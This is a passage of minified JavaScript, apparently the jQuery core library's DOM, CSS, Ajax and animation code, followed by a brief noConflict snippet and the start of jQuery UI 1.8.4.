a=y(this);c[0]=value.call(this,i,d?a.html():x);a.domManip(c,d,e)})}if(this[0]){if(c[0]&&c[0].parentNode&&c[0].parentNode.nodeType===11){f={fragment:c[0].parentNode}}else{f=buildFragment(c,this,scripts)}first=f.fragment.firstChild;if(first){d=d&&y.nodeName(first,"tr");for(var i=0,l=this.length;i<l;i++){e.call(d?root(this[i],first):this[i],f.cacheable||this.length>1||i>0?f.fragment.cloneNode(true):f.fragment)}}if(scripts){y.each(scripts,evalScript)}}return this;function root(a,b){return y.nodeName(a,"table")?(a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody"))):a}}});function cloneCopyEvent(d,e){var i=0;e.each(function(){if(this.nodeName!==(d[i]&&d[i].nodeName)){return}var a=y.data(d[i++]),curData=y.data(this,a),events=a&&a.events;if(events){delete curData.handle;curData.events={};for(var b in events){for(var c in events[b]){y.event.add(this,b,events[b][c],events[b][c].data)}}}})}function buildFragment(a,b,c){var d,cacheable,cacheresults,doc;if(a.length===1&&typeof a[0]==="string"&&a[0].length<512&&a[0].indexOf("<option")<0&&(y.support.checkClone||!rchecked.test(a[0]))){cacheable=true;cacheresults=y.fragments[a[0]];if(cacheresults){if(cacheresults!==1){d=cacheresults}}}if(!d){doc=(b&&b[0]?b[0].ownerDocument||b[0]:document);d=doc.createDocumentFragment();y.clean(a,doc,d,c)}if(cacheable){y.fragments[a[0]]=cacheresults?d:1}return{fragment:d,cacheable:cacheable}}y.fragments={};y.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(d,e){y.fn[d]=function(a){var b=[],insert=y(a);for(var i=0,l=insert.length;i<l;i++){var c=(i>0?this.clone(true):this).get();y.fn[e].apply(y(insert[i]),c);b=b.concat(c)}return this.pushStack(b,d,insert.selector)}});y.each({remove:function(a,b){if(!a||y.filter(a,[this]).length){if(!b&&this.nodeType===1){y.cleanData(this.getElementsByTagName("*"));y.cleanData([this])}if(this.parentNode){this.parentNode.removeChild(this)}}},empty:function(){if(this.nodeType===1){y.cleanData(this.getElementsByTagName("*"))}while(this.firstChild){this.removeChild(this.firstChild)}}},function(a,b){y.fn[a]=function(){return this.each(b,arguments)}});y.extend({clean:function(d,e,f,g){e=e||document;if(typeof e.createElement==="undefined"){e=e.ownerDocument||e[0]&&e[0].ownerDocument||document}var h=[];y.each(d,function(i,a){if(typeof a==="number"){a+=""}if(!a){return}if(typeof a==="string"&&!rhtml.test(a)){a=e.createTextNode(a)}else if(typeof a==="string"){a=a.replace(rxhtmlTag,fcloseTag);var b=(rtagName.exec(a)||["",""])[1].toLowerCase(),wrap=wrapMap[b]||wrapMap._default,depth=wrap[0],div=e.createElement("div");div.innerHTML=wrap[1]+a+wrap[2];while(depth--){div=div.lastChild}if(!y.support.tbody){var c=rtbody.test(a),tbody=b==="table"&&!c?div.firstChild&&div.firstChild.childNodes:wrap[1]==="<table>"&&!c?div.childNodes:[];for(var j=tbody.length-1;j>=0;--j){if(y.nodeName(tbody[j],"tbody")&&!tbody[j].childNodes.length){tbody[j].parentNode.removeChild(tbody[j])}}}if(!y.support.leadingWhitespace&&rleadingWhitespace.test(a)){div.insertBefore(e.createTextNode(rleadingWhitespace.exec(a)[0]),div.firstChild)}a=y.makeArray(div.childNodes)}if(a.nodeType){h.push(a)}else{h=y.merge(h,a)}});if(f){for(var i=0;h[i];i++){if(g&&y.nodeName(h[i],"script")&&(!h[i].type||h[i].type.toLowerCase()==="text/javascript")){g.push(h[i].parentNode?h[i].parentNode.removeChild(h[i]):h[i])}else{if(h[i].nodeType===1){h.splice.apply(h,[i+1,0].concat(y.makeArray(h[i].getElementsByTagName("script"))))}f.appendChild(h[i])}}}return h},cleanData:function(a){for(var i=0,elem,id;(elem=a[i])!=null;i++){y.event.remove(elem);y.removeData(elem)}}});var J=/z-?index|font-?weight|opacity|zoom|line-?height/i,ralpha=/alpha\([^)]*\)/,ropacity=/opacity=([^)]*)/,rfloat=/float/i,rdashAlpha=/-([a-z])/ig,rupper=/([A-Z])/g,rnumpx=/^-?\d+(?:px)?$/i,rnum=/^-?\d/,cssShow={position:"absolute",visibility:"hidden",display:"block"},cssWidth=["Left","Right"],cssHeight=["Top","Bottom"],getComputedStyle=document.defaultView&&document.defaultView.getComputedStyle,styleFloat=y.support.cssFloat?"cssFloat":"styleFloat",fcamelCase=function(a,b){return b.toUpperCase()};y.fn.css=function(d,e){return access(this,d,e,true,function(a,b,c){if(c===x){return y.curCSS(a,b)}if(typeof c==="number"&&!J.test(b)){c+="px"}y.style(a,b,c)})};y.extend({style:function(a,b,c){if(!a||a.nodeType===3||a.nodeType===8){return x}if((b==="width"||b==="height")&&parseFloat(c)<0){c=x}var d=a.style||a,set=c!==x;if(!y.support.opacity&&b==="opacity"){if(set){d.zoom=1;var e=parseInt(c,10)+""==="NaN"?"":"alpha(opacity="+c*100+")";var f=d.filter||y.curCSS(a,"filter")||"";d.filter=ralpha.test(f)?f.replace(ralpha,e):e}return d.filter&&d.filter.indexOf("opacity=")>=0?(parseFloat(ropacity.exec(d.filter)[1])/100)+"":""}if(rfloat.test(b)){b=styleFloat}b=b.replace(rdashAlpha,fcamelCase);if(set){d[b]=c}return d[b]},css:function(a,b,c,d){if(b==="width"||b==="height"){var e,props=cssShow,which=b==="width"?cssWidth:cssHeight;function getWH(){e=b==="width"?a.offsetWidth:a.offsetHeight;if(d==="border"){return}y.each(which,function(){if(!d){e-=parseFloat(y.curCSS(a,"padding"+this,true))||0}if(d==="margin"){e+=parseFloat(y.curCSS(a,"margin"+this,true))||0}else{e-=parseFloat(y.curCSS(a,"border"+this+"Width",true))||0}})}if(a.offsetWidth!==0){getWH()}else{y.swap(a,props,getWH)}return Math.max(0,Math.round(e))}return y.curCSS(a,b,c)},curCSS:function(a,b,c){var d,style=a.style,filter;if(!y.support.opacity&&b==="opacity"&&a.currentStyle){d=ropacity.test(a.currentStyle.filter||"")?(parseFloat(RegExp.$1)/100)+"":"";return d===""?"1":d}if(rfloat.test(b)){b=styleFloat}if(!c&&style&&style[b]){d=style[b]}else if(getComputedStyle){if(rfloat.test(b)){b="float"}b=b.replace(rupper,"-$1").toLowerCase();var e=a.ownerDocument.defaultView;if(!e){return null}var f=e.getComputedStyle(a,null);if(f){d=f.getPropertyValue(b)}if(b==="opacity"&&d===""){d="1"}}else if(a.currentStyle){var g=b.replace(rdashAlpha,fcamelCase);d=a.currentStyle[b]||a.currentStyle[g];if(!rnumpx.test(d)&&rnum.test(d)){var h=style.left,rsLeft=a.runtimeStyle.left;a.runtimeStyle.left=a.currentStyle.left;style.left=g==="fontSize"?"1em":(d||0);d=style.pixelLeft+"px";style.left=h;a.runtimeStyle.left=rsLeft}}return d},swap:function(a,b,c){var d={};for(var e in b){d[e]=a.style[e];a.style[e]=b[e]}c.call(a);for(var e in b){a.style[e]=d[e]}}});if(y.expr&&y.expr.filters){y.expr.filters.hidden=function(a){var b=a.offsetWidth,height=a.offsetHeight,skip=a.nodeName.toLowerCase()==="tr";return b===0&&height===0&&!skip?true:b>0&&height>0&&!skip?false:y.curCSS(a,"display")==="none"};y.expr.filters.visible=function(a){return!y.expr.filters.hidden(a)}}var K=now(),rscript=/<script(.|\s)*?\/script>/gi,rselectTextarea=/select|textarea/i,rinput=/color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week/i,jsre=/=\?(&|$)/,rquery=/\?/,rts=/(\?|&)_=.*?(&|$)/,rurl=/^(\w+:)?\/\/([^\/?#]+)/,r20=/%20/g;y.fn.extend({_load:y.fn.load,load:function(c,d,e){if(typeof c!=="string"){return this._load(c)}else if(!this.length){return this}var f=c.indexOf(" ");if(f>=0){var g=c.slice(f,c.length);c=c.slice(0,f)}var h="GET";if(d){if(y.isFunction(d)){e=d;d=null}else if(typeof d==="object"){d=y.param(d,y.ajaxSettings.traditional);h="POST"}}var i=this;y.ajax({url:c,type:h,dataType:"html",data:d,complete:function(a,b){if(b==="success"||b==="notmodified"){i.html(g?y("<div />").append(a.responseText.replace(rscript,"")).find(g):a.responseText)}if(e){i.each(e,[a.responseText,b,a])}}});return this},serialize:function(){return y.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?y.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||rselectTextarea.test(this.nodeName)||rinput.test(this.type))}).map(function(i,b){var c=y(this).val();return c==null?null:y.isArray(c)?y.map(c,function(a,i){return{name:b.name,value:a}}):{name:b.name,value:c}}).get()}});y.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(i,o){y.fn[o]=function(f){return this.bind(o,f)}});y.extend({get:function(a,b,c,d){if(y.isFunction(b)){d=d||c;c=b;b=null}return y.ajax({type:"GET",url:a,data:b,success:c,dataType:d})},getScript:function(a,b){return y.get(a,null,b,"script")},getJSON:function(a,b,c){return y.get(a,b,c,"json")},post:function(a,b,c,d){if(y.isFunction(b)){d=d||c;c=b;b={}}return y.ajax({type:"POST",url:a,data:b,success:c,dataType:d})},ajaxSetup:function(a){y.extend(y.ajaxSettings,a)},ajaxSettings:{url:location.href,global:true,type:"GET",contentType:"application/x-www-form-urlencoded",processData:true,async:true,xhr:w.XMLHttpRequest&&(w.location.protocol!=="file:"||!w.ActiveXObject)?function(){return new w.XMLHttpRequest()}:function(){try{return new w.ActiveXObject("Microsoft.XMLHTTP")}catch(e){}},accepts:{xml:"application/xml, text/xml",html:"text/html",script:"text/javascript, application/javascript",json:"application/json, text/javascript",text:"text/plain",_default:"*/*"}},lastModified:{},etag:{},ajax:function(c){var s=y.extend(true,{},y.ajaxSettings,c);var d,status,data,callbackContext=c&&c.context||s,type=s.type.toUpperCase();if(s.data&&s.processData&&typeof s.data!=="string"){s.data=y.param(s.data,s.traditional)}if(s.dataType==="jsonp"){if(type==="GET"){if(!jsre.test(s.url)){s.url+=(rquery.test(s.url)?"&":"?")+(s.jsonp||"callback")+"=?"}}else if(!s.data||!jsre.test(s.data)){s.data=(s.data?s.data+"&":"")+(s.jsonp||"callback")+"=?"}s.dataType="json"}if(s.dataType==="json"&&(s.data&&jsre.test(s.data)||jsre.test(s.url))){d=s.jsonpCallback||("jsonp"+K++);if(s.data){s.data=(s.data+"").replace(jsre,"="+d+"$1")}s.url=s.url.replace(jsre,"="+d+"$1");s.dataType="script";w[d]=w[d]||function(a){data=a;success();complete();w[d]=x;try{delete w[d]}catch(e){}if(i){i.removeChild(j)}}}if(s.dataType==="script"&&s.cache===null){s.cache=false}if(s.cache===false&&type==="GET"){var f=now();var g=s.url.replace(rts,"$1_="+f+"$2");s.url=g+((g===s.url)?(rquery.test(s.url)?"&":"?")+"_="+f:"")}if(s.data&&type==="GET"){s.url+=(rquery.test(s.url)?"&":"?")+s.data}if(s.global&&!y.active++){y.event.trigger("ajaxStart")}var h=rurl.exec(s.url),remote=h&&(h[1]&&h[1]!==location.protocol||h[2]!==location.host);if(s.dataType==="script"&&type==="GET"&&remote){var i=document.getElementsByTagName("head")[0]||document.documentElement;var j=document.createElement("script");j.src=s.url;if(s.scriptCharset){j.charset=s.scriptCharset}if(!d){var k=false;j.onload=j.onreadystatechange=function(){if(!k&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){k=true;success();complete();j.onload=j.onreadystatechange=null;if(i&&j.parentNode){i.removeChild(j)}}}}i.insertBefore(j,i.firstChild);return x}var l=false;var m=s.xhr();if(!m){return}if(s.username){m.open(type,s.url,s.async,s.username,s.password)}else{m.open(type,s.url,s.async)}try{if(s.data||c&&c.contentType){m.setRequestHeader("Content-Type",s.contentType)}if(s.ifModified){if(y.lastModified[s.url]){m.setRequestHeader("If-Modified-Since",y.lastModified[s.url])}if(y.etag[s.url]){m.setRequestHeader("If-None-Match",y.etag[s.url])}}if(!remote){m.setRequestHeader("X-Requested-With","XMLHttpRequest")}m.setRequestHeader("Accept",s.dataType&&s.accepts[s.dataType]?s.accepts[s.dataType]+", */*":s.accepts._default)}catch(e){}if(s.beforeSend&&s.beforeSend.call(callbackContext,m,s)===false){if(s.global&&!--y.active){y.event.trigger("ajaxStop")}m.abort();return false}if(s.global){trigger("ajaxSend",[m,s])}var n=m.onreadystatechange=function(a){if(!m||m.readyState===0||a==="abort"){if(!l){complete()}l=true;if(m){m.onreadystatechange=y.noop}}else if(!l&&m&&(m.readyState===4||a==="timeout")){l=true;m.onreadystatechange=y.noop;status=a==="timeout"?"timeout":!y.httpSuccess(m)?"error":s.ifModified&&y.httpNotModified(m,s.url)?"notmodified":"success";var b;if(status==="success"){try{data=y.httpData(m,s.dataType,s)}catch(err){status="parsererror";b=err}}if(status==="success"||status==="notmodified"){if(!d){success()}}else{y.handleError(s,m,status,b)}complete();if(a==="timeout"){m.abort()}if(s.async){m=null}}};try{var o=m.abort;m.abort=function(){if(m){o.call(m)}n("abort")}}catch(e){}if(s.async&&s.timeout>0){setTimeout(function(){if(m&&!l){n("timeout")}},s.timeout)}try{m.send(type==="POST"||type==="PUT"||type==="DELETE"?s.data:null)}catch(e){y.handleError(s,m,null,e);complete()}if(!s.async){n()}function success(){if(s.success){s.success.call(callbackContext,data,status,m)}if(s.global){trigger("ajaxSuccess",[m,s])}}function complete(){if(s.complete){s.complete.call(callbackContext,m,status)}if(s.global){trigger("ajaxComplete",[m,s])}if(s.global&&!--y.active){y.event.trigger("ajaxStop")}}function trigger(a,b){(s.context?y(s.context):y.event).trigger(a,b)}return m},handleError:function(s,a,b,e){if(s.error){s.error.call(s.context||s,a,b,e)}if(s.global){(s.context?y(s.context):y.event).trigger("ajaxError",[a,s,e])}},active:0,httpSuccess:function(a){try{return!a.status&&location.protocol==="file:"||(a.status>=200&&a.status<300)||a.status===304||a.status===1223||a.status===0}catch(e){}return false},httpNotModified:function(a,b){var c=a.getResponseHeader("Last-Modified"),etag=a.getResponseHeader("Etag");if(c){y.lastModified[b]=c}if(etag){y.etag[b]=etag}return a.status===304||a.status===0},httpData:function(a,b,s){var c=a.getResponseHeader("content-type")||"",xml=b==="xml"||!b&&c.indexOf("xml")>=0,data=xml?a.responseXML:a.responseText;if(xml&&data.documentElement.nodeName==="parsererror"){y.error("parsererror")}if(s&&s.dataFilter){data=s.dataFilter(data,b)}if(typeof data==="string"){if(b==="json"||!b&&c.indexOf("json")>=0){data=y.parseJSON(data)}else if(b==="script"||!b&&c.indexOf("javascript")>=0){y.globalEval(data)}}return data},param:function(a,c){var s=[];if(c===x){c=y.ajaxSettings.traditional}if(y.isArray(a)||a.jquery){y.each(a,function(){add(this.name,this.value)})}else{for(var d in a){buildParams(d,a[d])}}return s.join("&").replace(r20,"+");function buildParams(a,b){if(y.isArray(b)){y.each(b,function(i,v){if(c){add(a,v)}else{buildParams(a+"["+(typeof v==="object"||y.isArray(v)?i:"")+"]",v)}})}else if(!c&&b!=null&&typeof b==="object"){y.each(b,function(k,v){buildParams(a+"["+k+"]",v)})}else{add(a,b)}}function add(a,b){b=y.isFunction(b)?b():b;s[s.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)}}});var L={},rfxtypes=/toggle|show|hide/,rfxnum=/^([+-]=)?([\d+-.]+)(.*)$/,timerId,fxAttrs=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]];y.fn.extend({show:function(a,b){if(a||a===0){return this.animate(genFx("show",3),a,b)}else{for(var i=0,l=this.length;i<l;i++){var c=y.data(this[i],"olddisplay");this[i].style.display=c||"";if(y.css(this[i],"display")==="none"){var d=this[i].nodeName,display;if(L[d]){display=L[d]}else{var e=y("<"+d+" />").appendTo("body");display=e.css("display");if(display==="none"){display="block"}e.remove();L[d]=display}y.data(this[i],"olddisplay",display)}}for(var j=0,k=this.length;j<k;j++){this[j].style.display=y.data(this[j],"olddisplay")||""}return this}},hide:function(a,b){if(a||a===0){return this.animate(genFx("hide",3),a,b)}else{for(var i=0,l=this.length;i<l;i++){var c=y.data(this[i],"olddisplay");if(!c&&c!=="none"){y.data(this[i],"olddisplay",y.css(this[i],"display"))}}for(var j=0,k=this.length;j<k;j++){this[j].style.display="none"}return this}},_toggle:y.fn.toggle,toggle:function(b,c){var d=typeof b==="boolean";if(y.isFunction(b)&&y.isFunction(c)){this._toggle.apply(this,arguments)}else if(b==null||d){this.each(function(){var a=d?b:y(this).is(":hidden");y(this)[a?"show":"hide"]()})}else{this.animate(genFx("toggle",3),b,c)}return this},fadeTo:function(a,b,c){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c)},animate:function(h,i,j,k){var l=y.speed(i,j,k);if(y.isEmptyObject(h)){return this.each(l.complete)}return this[l.queue===false?"each":"queue"](function(){var f=y.extend({},l),p,hidden=this.nodeType===1&&y(this).is(":hidden"),self=this;for(p in h){var g=p.replace(rdashAlpha,fcamelCase);if(p!==g){h[g]=h[p];delete h[p];p=g}if(h[p]==="hide"&&hidden||h[p]==="show"&&!hidden){return f.complete.call(this)}if((p==="height"||p==="width")&&this.style){f.display=y.css(this,"display");f.overflow=this.style.overflow}if(y.isArray(h[p])){(f.specialEasing=f.specialEasing||{})[p]=h[p][1];h[p]=h[p][0]}}if(f.overflow!=null){this.style.overflow="hidden"}f.curAnim=y.extend({},h);y.each(h,function(a,b){var e=new y.fx(self,f,a);if(rfxtypes.test(b)){e[b==="toggle"?hidden?"show":"hide":b](h)}else{var c=rfxnum.exec(b),start=e.cur(true)||0;if(c){var d=parseFloat(c[2]),unit=c[3]||"px";if(unit!=="px"){self.style[a]=(d||1)+unit;start=((d||1)/e.cur(true))*start;self.style[a]=start+unit}if(c[1]){d=((c[1]==="-="?-1:1)*d)+start}e.custom(start,d,unit)}else{e.custom(start,b,"")}}});return true})},stop:function(a,b){var c=y.timers;if(a){this.queue([])}this.each(function(){for(var i=c.length-1;i>=0;i--){if(c[i].elem===this){if(b){c[i](true)}c.splice(i,1)}}});if(!b){this.dequeue()}return this}});y.each({slideDown:genFx("show",1),slideUp:genFx("hide",1),slideToggle:genFx("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"}},function(c,d){y.fn[c]=function(a,b){return this.animate(d,a,b)}});y.extend({speed:function(a,b,c){var d=a&&typeof a==="object"?a:{complete:c||!c&&b||y.isFunction(a)&&a,duration:a,easing:c&&b||b&&!y.isFunction(b)&&b};d.duration=y.fx.off?0:typeof d.duration==="number"?d.duration:y.fx.speeds[d.duration]||y.fx.speeds._default;d.old=d.complete;d.complete=function(){if(d.queue!==false){y(this).dequeue()}if(y.isFunction(d.old)){d.old.call(this)}};return d},easing:{linear:function(p,n,a,b){return a+b*p},swing:function(p,n,a,b){return((-Math.cos(p*Math.PI)/2)+0.5)*b+a}},timers:[],fx:function(a,b,c){this.options=b;this.elem=a;this.prop=c;if(!b.orig){b.orig={}}}});y.fx.prototype={update:function(){if(this.options.step){this.options.step.call(this.elem,this.now,this)}(y.fx.step[this.prop]||y.fx.step._default)(this);if((this.prop==="height"||this.prop==="width")&&this.elem.style){this.elem.style.display="block"}},cur:function(a){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null)){return this.elem[this.prop]}var r=parseFloat(y.css(this.elem,this.prop,a));return r&&r>-10000?r:parseFloat(y.curCSS(this.elem,this.prop))||0},custom:function(b,c,d){this.startTime=now();this.start=b;this.end=c;this.unit=d||this.unit||"px";this.now=this.start;this.pos=this.state=0;var e=this;function t(a){return e.step(a)}t.elem=this.elem;if(t()&&y.timers.push(t)&&!timerId){timerId=setInterval(y.fx.tick,13)}},show:function(){this.options.orig[this.prop]=y.style(this.elem,this.prop);this.options.show=true;this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur());y(this.elem).show()},hide:function(){this.options.orig[this.prop]=y.style(this.elem,this.prop);this.options.hide=true;this.custom(this.cur(),0)},step:function(a){var t=now(),done=true;if(a||t>=this.options.duration+this.startTime){this.now=this.end;this.pos=this.state=1;this.update();this.options.curAnim[this.prop]=true;for(var i in this.options.curAnim){if(this.options.curAnim[i]!==true){done=false}}if(done){if(this.options.display!=null){this.elem.style.overflow=this.options.overflow;var b=y.data(this.elem,"olddisplay");this.elem.style.display=b?b:this.options.display;if(y.css(this.elem,"display")==="none"){this.elem.style.display="block"}}if(this.options.hide){y(this.elem).hide()}if(this.options.hide||this.options.show){for(var p in this.options.curAnim){y.style(this.elem,p,this.options.orig[p])}}this.options.complete.call(this.elem)}return false}else{var n=t-this.startTime;this.state=n/this.options.duration;var c=this.options.specialEasing&&this.options.specialEasing[this.prop];var d=this.options.easing||(y.easing.swing?"swing":"linear");this.pos=y.easing[c||d](this.state,n,0,1,this.options.duration);this.now=this.start+((this.end-this.start)*this.pos);this.update()}return true}};y.extend(y.fx,{tick:function(){var a=y.timers;for(var i=0;i<a.length;i++){if(!a[i]()){a.splice(i--,1)}}if(!a.length){y.fx.stop()}},stop:function(){clearInterval(timerId);timerId=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){y.style(a.elem,"opacity",a.now)},_default:function(a){if(a.elem.style&&a.elem.style[a.prop]!=null){a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit}else{a.elem[a.prop]=a.now}}}});if(y.expr&&y.expr.filters){y.expr.filters.animated=function(b){return y.grep(y.timers,function(a){return b===a.elem}).length}}function genFx(a,b){var c={};y.each(fxAttrs.concat.apply([],fxAttrs.slice(0,b)),function(){c[this]=a});return c}if("getBoundingClientRect"in document.documentElement){y.fn.offset=function(a){var b=this[0];if(a){return this.each(function(i){y.offset.setOffset(this,a,i)})}if(!b||!b.ownerDocument){return null}if(b===b.ownerDocument.body){return y.offset.bodyOffset(b)}var c=b.getBoundingClientRect(),doc=b.ownerDocument,body=doc.body,docElem=doc.documentElement,clientTop=docElem.clientTop||body.clientTop||0,clientLeft=docElem.clientLeft||body.clientLeft||0,top=c.top+(self.pageYOffset||y.support.boxModel&&docElem.scrollTop||body.scrollTop)-clientTop,left=c.left+(self.pageXOffset||y.support.boxModel&&docElem.scrollLeft||body.scrollLeft)-clientLeft;return{top:top,left:left}}}else{y.fn.offset=function(a){var b=this[0];if(a){return this.each(function(i){y.offset.setOffset(this,a,i)})}if(!b||!b.ownerDocument){return null}if(b===b.ownerDocument.body){return y.offset.bodyOffset(b)}y.offset.initialize();var c=b.offsetParent,prevOffsetParent=b,doc=b.ownerDocument,computedStyle,docElem=doc.documentElement,body=doc.body,defaultView=doc.defaultView,prevComputedStyle=defaultView?defaultView.getComputedStyle(b,null):b.currentStyle,top=b.offsetTop,left=b.offsetLeft;while((b=b.parentNode)&&b!==body&&b!==docElem){if(y.offset.supportsFixedPosition&&prevComputedStyle.position==="fixed"){break}computedStyle=defaultView?defaultView.getComputedStyle(b,null):b.currentStyle;top-=b.scrollTop;left-=b.scrollLeft;if(b===c){top+=b.offsetTop;left+=b.offsetLeft;if(y.offset.doesNotAddBorder&&!(y.offset.doesAddBorderForTableAndCells&&/^t(able|d|h)$/i.test(b.nodeName))){top+=parseFloat(computedStyle.borderTopWidth)||0;left+=parseFloat(computedStyle.borderLeftWidth)||0}prevOffsetParent=c,c=b.offsetParent}if(y.offset.subtractsBorderForOverflowNotVisible&&computedStyle.overflow!=="visible"){top+=parseFloat(computedStyle.borderTopWidth)||0;left+=parseFloat(computedStyle.borderLeftWidth)||0}prevComputedStyle=computedStyle}if(prevComputedStyle.position==="relative"||prevComputedStyle.position==="static"){top+=body.offsetTop;left+=body.offsetLeft}if(y.offset.supportsFixedPosition&&prevComputedStyle.position==="fixed"){top+=Math.max(docElem.scrollTop,body.scrollTop);left+=Math.max(docElem.scrollLeft,body.scrollLeft)}return{top:top,left:left}}}y.offset={initialize:function(){var a=document.body,container=document.createElement("div"),innerDiv,checkDiv,table,td,bodyMarginTop=parseFloat(y.curCSS(a,"marginTop",true))||0,html="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";y.extend(container.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"});container.innerHTML=html;a.insertBefore(container,a.firstChild);innerDiv=container.firstChild;checkDiv=innerDiv.firstChild;td=innerDiv.nextSibling.firstChild.firstChild;this.doesNotAddBorder=(checkDiv.offsetTop!==5);this.doesAddBorderForTableAndCells=(td.offsetTop===5);checkDiv.style.position="fixed",checkDiv.style.top="20px";this.supportsFixedPosition=(checkDiv.offsetTop===20||checkDiv.offsetTop===15);checkDiv.style.position=checkDiv.style.top="";innerDiv.style.overflow="hidden",innerDiv.style.position="relative";this.subtractsBorderForOverflowNotVisible=(checkDiv.offsetTop===-5);this.doesNotIncludeMarginInBodyOffset=(a.offsetTop!==bodyMarginTop);a.removeChild(container);a=container=innerDiv=checkDiv=table=td=null;y.offset.initialize=y.noop},bodyOffset:function(a){var b=a.offsetTop,left=a.offsetLeft;y.offset.initialize();if(y.offset.doesNotIncludeMarginInBodyOffset){b+=parseFloat(y.curCSS(a,"marginTop",true))||0;left+=parseFloat(y.curCSS(a,"marginLeft",true))||0}return{top:b,left:left}},setOffset:function(a,b,i){if(/static/.test(y.curCSS(a,"position"))){a.style.position="relative"}var c=y(a),curOffset=c.offset(),curTop=parseInt(y.curCSS(a,"top",true),10)||0,curLeft=parseInt(y.curCSS(a,"left",true),10)||0;if(y.isFunction(b)){b=b.call(a,i,curOffset)}var d={top:(b.top-curOffset.top)+curTop,left:(b.left-curOffset.left)+curLeft};if("using"in b){b.using.call(a,d)}else{c.css(d)}}};y.fn.extend({position:function(){if(!this[0]){return null}var a=this[0],offsetParent=this.offsetParent(),offset=this.offset(),parentOffset=/^body|html$/i.test(offsetParent[0].nodeName)?{top:0,left:0}:offsetParent.offset();offset.top-=parseFloat(y.curCSS(a,"marginTop",true))||0;offset.left-=parseFloat(y.curCSS(a,"marginLeft",true))||0;parentOffset.top+=parseFloat(y.curCSS(offsetParent[0],"borderTopWidth",true))||0;parentOffset.left+=parseFloat(y.curCSS(offsetParent[0],"borderLeftWidth",true))||0;return{top:offset.top-parentOffset.top,left:offset.left-parentOffset.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||document.body;while(a&&(!/^body|html$/i.test(a.nodeName)&&y.css(a,"position")==="static")){a=a.offsetParent}return a})}});y.each(["Left","Top"],function(i,c){var d="scroll"+c;y.fn[d]=function(a){var b=this[0],win;if(!b){return null}if(a!==x){return this.each(function(){win=getWindow(this);if(win){win.scrollTo(!i?a:y(win).scrollLeft(),i?a:y(win).scrollTop())}else{this[d]=a}})}else{win=getWindow(b);return win?("pageXOffset"in win)?win[i?"pageYOffset":"pageXOffset"]:y.support.boxModel&&win.document.documentElement[d]||win.document.body[d]:b[d]}}});function getWindow(a){return("scrollTo"in a&&a.document)?a:a.nodeType===9?a.defaultView||a.parentWindow:false}y.each(["Height","Width"],function(i,d){var e=d.toLowerCase();y.fn["inner"+d]=function(){return this[0]?y.css(this[0],e,false,"padding"):null};y.fn["outer"+d]=function(a){return this[0]?y.css(this[0],e,false,a?"margin":"border"):null};y.fn[e]=function(b){var c=this[0];if(!c){return b==null?null:this}if(y.isFunction(b)){return this.each(function(i){var a=y(this);a[e](b.call(this,i,a[e]()))})}return("scrollTo"in c&&c.document)?c.document.compatMode==="CSS1Compat"&&c.document.documentElement["client"+d]||c.document.body["client"+d]:(c.nodeType===9)?Math.max(c.documentElement["client"+d],c.body["scroll"+d],c.documentElement["scroll"+d],c.body["offset"+d],c.documentElement["offset"+d]):b===x?y.css(c,e):this.css(e,typeof b==="string"?b:b+"px")}});w.jQuery=w.$=y})(window);




// noConflit
if(window.jQuery === window.$){
	window.jQuery.noConflict();
	//console.log("jQuery noConflict");
}

var $ = window.jQuery;
var jQuery = $;
w.jQuery = $;
(function(c,j){function k(a){return!c(a).parents().andSelf().filter(function(){return c.curCSS(this,"visibility")==="hidden"||c.expr.filters.hidden(this)}).length}c.ui=c.ui||{};if(!c.ui.version){c.extend(c.ui,{version:"1.8.4",plugin:{add:function(a,b,d){a=c.ui[a].prototype;for(var e in d){a.plugins[e]=a.plugins[e]||[];a.plugins[e].push([b,d[e]])}},call:function(a,b,d){if((b=a.plugins[b])&&a.element[0].parentNode)for(var e=0;e<b.length;e++)a.options[b[e][0]]&&b[e][1].apply(a.element,d)}},contains:function(a,
b){return document.compareDocumentPosition?a.compareDocumentPosition(b)&16:a!==b&&a.contains(b)},hasScroll:function(a,b){if(c(a).css("overflow")==="hidden")return false;b=b&&b==="left"?"scrollLeft":"scrollTop";var d=false;if(a[b]>0)return true;a[b]=1;d=a[b]>0;a[b]=0;return d},isOverAxis:function(a,b,d){return a>b&&a<b+d},isOver:function(a,b,d,e,h,i){return c.ui.isOverAxis(a,d,h)&&c.ui.isOverAxis(b,e,i)},keyCode:{ALT:18,BACKSPACE:8,CAPS_LOCK:20,COMMA:188,COMMAND:91,COMMAND_LEFT:91,COMMAND_RIGHT:93,
